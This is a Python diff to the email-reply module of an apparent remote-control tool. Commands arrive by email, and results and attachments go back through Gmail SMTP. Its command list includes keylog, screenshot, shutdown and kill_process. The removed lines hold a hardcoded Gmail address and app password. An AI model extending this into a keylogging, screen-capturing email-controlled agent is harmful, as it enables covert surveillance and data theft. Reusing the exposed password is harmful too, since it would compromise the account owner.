@@ -2,14 +2,13 @@ import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.image import MIMEImage
-from email.mime.base import MIMEBase
-from email import encoders
-import mail_handle_receive
+import resource_monitor
+import variables
 
-smpt_host = 'smtp.gmail.com'
-smpt_port = 587  # SSL 465, TLS 587
-SENDER_EMAIL = 'dummymailbox5186@gmail.com'
-SENDER_PASSWORD = "omwv msnm mxbx wllh"
+smpt_host = variables.smpt_host
+smpt_port = variables.smpt_port
+USER_EMAIL = variables.USER_EMAIL
+USER_PASSWORD = variables.USER_PASSWORD
 
 
 def main():
@@ -18,15 +17,27 @@ def main():
 
 
 def send_mail_success_execution(recipient_mail, command, filename=None):
+    print('Command executed successfully:', command)
+    print('Sending email...')
     msg = MIMEMultipart()
-    msg['From'] = SENDER_EMAIL
+    msg['From'] = USER_EMAIL
     msg['To'] = recipient_mail
     msg['Subject'] = "[Result] Remote Control Command"
+
     if command == 'help':
-        help = 'Available commands: help, shutdown, screenshot, keylog'
+        response = '''Available commands:
+        help
+        shutdown
+        screenshot
+        keylog
+        list_processes
+        kill_process <pid>'''
+    elif command == 'list_processes':
+        response = resource_monitor.list_processes()
     else:
-        help = ''
-    body = f'Executed successfully: {command}\n{help}'
+        response = ''
+
+    body = f'Executed successfully:\n{command}\n{response}'
     msg.attach(MIMEText(body, 'plain'))
     # if has attachment
     if filename != None:
@@ -43,9 +54,9 @@ def send_mail_success_execution(recipient_mail, command, filename=None):
     try:
         server = smtplib.SMTP(smpt_host, smpt_port)
         server.starttls()
-        server.login(SENDER_EMAIL, SENDER_PASSWORD)
+        server.login(USER_EMAIL, USER_PASSWORD)
         text = msg.as_string()
-        server.sendmail(SENDER_EMAIL, recipient_mail, text)
+        server.sendmail(USER_EMAIL, recipient_mail, text)
         server.quit()
         print("Email sent successfully")
     except Exception as e:
@@ -53,8 +64,10 @@ def send_mail_success_execution(recipient_mail, command, filename=None):
 
 
 def send_mail_failure_execution(recipient_mail, command):
+    print('Failed to execute:', command)
+    print('Sending email...')
     msg = MIMEMultipart()
-    msg['From'] = SENDER_EMAIL
+    msg['From'] = USER_EMAIL
     msg['To'] = recipient_mail
     msg['Subject'] = "[Result] Remote Control Command"
     body = 'Failed to execute: ' + command
@@ -62,9 +75,9 @@ def send_mail_failure_execution(recipient_mail, command):
     try:
         server = smtplib.SMTP(smpt_host, smpt_port)
         server.starttls()
-        server.login(SENDER_EMAIL, SENDER_PASSWORD)
+        server.login(USER_EMAIL, USER_PASSWORD)
         text = msg.as_string()
-        server.sendmail(SENDER_EMAIL, recipient_mail, text)
+        server.sendmail(USER_EMAIL, recipient_mail, text)
         server.quit()
         print("Email sent successfully")
     except Exception as e:
